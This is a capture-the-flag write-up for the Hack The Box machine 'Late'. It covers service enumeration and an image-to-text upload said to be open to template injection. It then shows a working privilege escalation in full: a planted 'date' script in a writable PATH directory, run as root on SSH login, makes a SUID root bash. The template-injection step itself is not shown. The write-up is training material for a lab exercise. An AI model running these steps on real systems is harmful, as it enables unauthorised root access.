# [late](https://app.hackthebox.com/machines/Late)

> The Linux server hosting Late, a web application of tools for working with graphics files. One of its virtual hosts serves a web application for extracting text from images. However, it renders the text it extracts as a Jinja2 template, making a server-side template injetion (SSTI) vulnerability available. By leveraging this vulnerability to read a low-privilege user's SSH private key, a shell can be obtained. The system is configured to execute `/usr/local/sbin/ssh-alert.sh` as `root` whenever someone logs in via SSH. `ssh-alert.sh` runs `date` without an absolute path, `/usr/local/sbin` is near the front of the system's `PATH` environment variable, and `/usr/local/sbin` is writable by the owned low-privilege user. This all makes it possible to achieve arbitrary code execution by writing malicious executable named `date` into `/usr/local/sbin` and logging in via SSH.

---

## Open Port Enumeration

### TCP

The target's TCP ports 22 and 80 are open.

```bash
$ sudo masscan -p1-65535 --rate=1000 -e tun0 --output-format grepable --output-filename enum/late.masscan 10.129.164.101
$ cat enum/late.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
22,80,
```

According to [launchpad], the target's operating system is likely Ubuntu 18.04 (Bionic).

Port 80 appears to be running nginx 1.14.0. The website's title is "Late - best online image tools."

```bash
$ nmap -sC -sV -p22,80 -oA late 10.129.164.101
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-23 19:08 EDT
Nmap scan report for 10.129.164.101
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.41 seconds
```

### UDP

There are no open UDP ports.

---

## `http://late.htb`: Late's Website

Late, a website of online tools for working with graphics files. Advertises an online photo editor that allows you to add text and other graphics to photos.

The photo editor can be found at `images.late.htb`. Add this and `late.htb` to the local DNS resolver.

### Content Discovery

```bash
$ feroxbuster -u http://late.htb -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://late.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
301      GET        7l       13w      194c http://late.htb/assets => http://late.htb/assets/
[####################] - 30s    29999/29999   0s      found:1       errors:0
[####################] - 30s    29999/29999   991/s   http://10.129.164.101
```

### Virtual Host Discovery

Only `images.late.htb` is live.

```bash
$ gobuster vhost -u http://late.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://late.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/04/23 19:17:02 Starting gobuster in VHOST enumeration mode
===============================================================
Found: images.late.htb (Status: 200) [Size: 2187]

===============================================================
2022/04/23 19:17:27 Finished
===============================================================
```

---

## `http://images.late.htb`: Late's Image-to-Text Converter

Late's photo editor. Allows you to convert an image into text "with Flask."

### Content Discovery

`GET /scanner` returns a 500.

```bash
$ feroxbuster -u http://images.late.htb -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.5.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://images.late.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.5.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
500      GET        4l       40w      290c http://images.late.htb/scanner
[####################] - 33s    29999/29999   0s      found:1       errors:0
[####################] - 33s    29999/29999   894/s   http://images.late.htb
```

### Virtual Host Discovery

No virtual hosts.

```bash
$ gobuster vhost -u http://images.late.htb -w //usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://images.late.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     //usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/04/23 19:42:11 Starting gobuster in VHOST enumeration mode
===============================================================

===============================================================
2022/04/23 19:42:37 Finished
===============================================================
```

### Image to Text Converter - `POST /scanner`

Takes an image of text, parses out the text, and returns the text wrapped in HTML `<p>` tags as a plaintext file attachment.

Lorem ipsum image upload:

```http
POST /scanner HTTP/1.1
Host: images.late.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------311381575540254322881151867818
Content-Length: 71726
Origin: http://images.late.htb
Connection: close
Referer: http://images.late.htb/
Upgrade-Insecure-Requests: 1

-----------------------------311381575540254322881151867818
Content-Disposition: form-data; name="file"; filename="Lorem_Ipsum_Helvetica.png"
Content-Type: image/png
...
-----------------------------311381575540254322881151867818--
```

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sat, 23 Apr 2022 23:24:17 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 906
Connection: close
Content-Disposition: attachment; filename=results.txt
Last-Modified: Sat, 23 Apr 2022 23:24:17 GMT
Cache-Control: no-cache
ETag: "1650756257.593477-906-369430052"

<p>Helvetica

Lorem ipsum dolor sit amet, consetetur sadipscing
elitr, sed diam nonumy eirmod tempor invidunt ut
labore et dolore magna aliquyam erat, sed diam
voluptua. At vero eos et accusam et justo duo
dolores et ea rebum. Stet clita kasd gubergren, no
sea takimata sanctus est Lorem ipsum dolor sit
amet. Lorem ipsum dolor sit amet, consetetur
sadipscing elitr, sed diam nonumy eirmod tempor
invidunt ut labore et dolore magna aliquyam erat,
sed diam voluptua. At vero eos et accusam et justo
duo dolores et ea rebum. Stet clita kasd gubergren,
no sea takimata sanctus est Lorem ipsum dolor sit
amet. Lorem ipsum dolor sit amet, consetetur
sadipscing elitr, sed diam nonumy eirmod tempor
invidunt ut labore et dolore magna aliquyam erat,
sed diam voluptua. At vero eos et accusam et justo
duo dolores et ea rebum. Stet clita kasd gubergren,
no sea takimata sanctus est Lorem ipsum dolor sit
amet.
</p>
```

Attempting to upload a plaintext file named `results.txt` results in an error from the application, specifying an invalid extension.

Attempting to upload a plaintext file with an image extension (i.e., `png`) results in a runtime error that leaks some useful information: `Error occured while processing the image: cannot identify image file '/home/svc_acc/app/uploads/results.png1457'`. A user's name is `svc_acc` and the file is saved on disk at `/home/svc_acc/app/uploads/$FILENAME$N`, where `$N` is a random 4 character integer.

---

## SSH Alerting & `PATH` Privilege Escalation

[linPEAS](https://github.com/carlospolop/PEASS-ng) flags that `/usr/local/sbin` is the first directory in the system's `PATH`. This directory is writable by `svc_acc` and contains a single shell script (owned by `svc_acc`), `ssh-alert.sh`.

```bash
svc_acc@late:~$ ls -la /usr/local/sbin
total 12
drwxr-xr-x  2 svc_acc svc_acc 4096 Apr 26 14:49 .
drwxr-xr-x 10 root    root    4096 Aug  6  2020 ..
-rwxr-xr-x  1 svc_acc svc_acc  433 Apr 26 14:49 ssh-alert.sh
```

This script sends an email to `root` via `/usr/bin/sendmail` whenever someone logs in via SSH. It also executes `date` and `uname -a`.

```bash
#!/bin/bash

RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"

BODY="
A SSH login was detected.

        User:        $PAM_USER
        User IP Host: $PAM_RHOST
        Service:     $PAM_SERVICE
        TTY:         $PAM_TTY
        Date:        `date`
        Server:      `uname -a`
"

if [ ${PAM_TYPE} = "open_session" ]; then
        echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```

By running [pspy](https://github.com/DominicBreuker/pspy) and logging in via SSH, it appears this script is executed by `root`.

```txt
...
2022/04/26 14:53:31 CMD: UID=0    PID=4815   | /bin/bash /usr/local/sbin/ssh-alert.sh
...
```

In `/usr/local/sbin`, create a shell script named `date` that creates a SUID `root` copy of `/bin/bash`.

```bash
svc_acc@late:/usr/local/sbin$ cat date
#!/bin/sh

cp /bin/bash /home/svc_acc/bash
chmod +s /home/svc_acc/bash
```

Log in via SSH and note the creation of the SUID `root` `bash` executable.

```bash
$ ssh -i svc_acc svc_acc@late.htb
svc_acc@late:~$ ls -la ~/bash
-rwsr-sr-x 1 root root 1113504 Apr 26 14:59 /home/svc_acc/bash
```

Run the SUID `root` `bash` and retrieve the system flag from `/root/root.txt`.

```bash
svc_acc@late:~$ ~/bash -p
bash-4.4# id
uid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) egid=0(root) groups=0(root),1000(svc_acc)
bash-4.4# ls -la /root/root.txt
-rw-r----- 1 root root 33 Apr 26 06:34 /root/root.txt
```
